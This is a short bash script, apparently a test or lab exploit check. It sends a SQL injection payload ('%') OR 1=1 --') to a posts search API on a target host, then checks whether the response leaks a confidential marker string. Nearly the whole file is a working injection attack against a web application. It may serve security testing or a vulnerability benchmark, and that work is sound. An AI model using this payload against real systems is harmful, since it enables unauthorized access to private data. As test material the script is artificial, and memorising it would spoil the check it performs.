#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
body=$(curl -s --get "$TARGET/api/posts/search" --data-urlencode "q=%') OR 1=1 --")
grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a' <<<"$body"
